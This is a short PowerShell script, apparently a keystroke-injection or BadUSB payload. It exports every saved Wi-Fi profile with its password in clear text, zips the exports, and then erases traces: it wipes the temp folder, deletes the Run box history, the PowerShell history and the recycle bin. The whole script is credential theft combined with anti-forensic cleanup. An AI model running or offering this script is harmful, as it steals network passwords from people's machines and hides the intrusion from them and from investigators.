mkdir "$env:TEMP\wifi"

netsh wlan show profiles

netsh wlan export profile key=clear folder="$env:TEMP\wifi"

Compress-Archive -Path "$env:TEMP\wifi\*" -DestinationPath "$env:TEMP\wifi\wifi.zip" -Force

# empty temp folder
rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue

# delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f

# Delete powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath

# Empty recycle bin
Clear-RecycleBin -Force -ErrorAction SilentlyContinue
